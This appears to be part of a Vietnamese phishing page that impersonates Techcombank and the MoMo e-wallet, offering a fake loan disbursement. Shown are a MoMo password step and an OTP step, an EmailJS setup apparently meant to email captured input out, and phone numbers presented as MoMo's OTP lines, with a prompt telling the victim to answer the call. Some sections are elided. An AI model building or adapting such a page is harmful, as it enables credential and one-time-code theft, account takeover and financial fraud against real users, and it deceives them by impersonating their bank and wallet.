<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Xác nhận khoản vay TECHCOMBANK và giải ngân qua MoMo"
    />
    <title>Xác Nhận Thanh Toán - TECHCOMBANK</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Pacifico&display=swap"
      rel="stylesheet"
    />

    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init({
        publicKey: "AyeABaIEurj8BstPw", // Thay bằng Public Key của bạn
        });
      })();
    </script>

    <style>
      :root {
        /* --- Bảng màu MoMo --- */
        --fecredit-blue: #004695;
        --fecredit-primary: #d82d8b;
        --fecredit-primary-dark: #015C2E;
        --fecredit-red: #d82d8b;
        --momo-pink: #d82d8b;
        --momo-pink-darker: #ae2070;
        --text-primary: #1a202c;
        --text-secondary: #4a5568;
        --text-tertiary: #718096;
        --background-primary: #ffffff;
        --background-secondary: #f7fafc;
        --border-color: #e2e8f0;
        --success: #38a169;
        --error: #e53e3e;
        --global-font: "Inter", sans-serif;
      }
      /* ...phần CSS giữ nguyên... */
    </style>
  </head>
  <body>
    <div class="mobile-frame">
      <!-- ...các section phía trên giữ nguyên... -->
      <div id="momo-otp-section" class="page-section">
        <header class="page-header">
          <button
            class="back-button"
            onclick="showSection('momo-password-section')"
          >
            <img
              src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e"
              alt="Back"
            />
          </button>
          <h1>Xác thực OTP</h1>
        </header>
        <main class="login-page-layout">
          <div class="login-content">
            <div class="login-header">
              <h2 class="momo-section-title">
                <span class="cursive-pink">Xác thực OTP</span> của bạn
              </h2>
              <p class="subtitle" id="momo-otp-prompt" style="margin-top:10px;">
                <span class="otp-phone-blue">028 9999 5555</span> (<span class="otp-phone-blue">028 7306 555</span>) là số MOMO cấp mã hóa OTP. Bạn nghe máy nhé.
              </p>
            </div>
            <!-- ...phần dưới giữ nguyên... -->
          </div>
          <div class="login-footer">
            <button
              class="button momo-btn"
              id="momo-otp-submit-btn"
              onclick="handleOtpSubmit()"
              disabled
            >
              Xác nhận
            </button>
          </div>
        </main>
        <div class="tet-decor">
          <div class="tet-decor-left">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTw9pqLJDGPP2grVigNYcXvI_LuDPKSvw5cVg&s" alt="tet-decor" style="max-width:100px; height:auto;" />
          </div>
          <div class="tet-decor-right">🪙💰<br>🏮</div>
        </div>
      </div>
      <!-- ...các section phía dưới, scripts v.v. giữ nguyên... -->
    </div>
  </body>
</html>
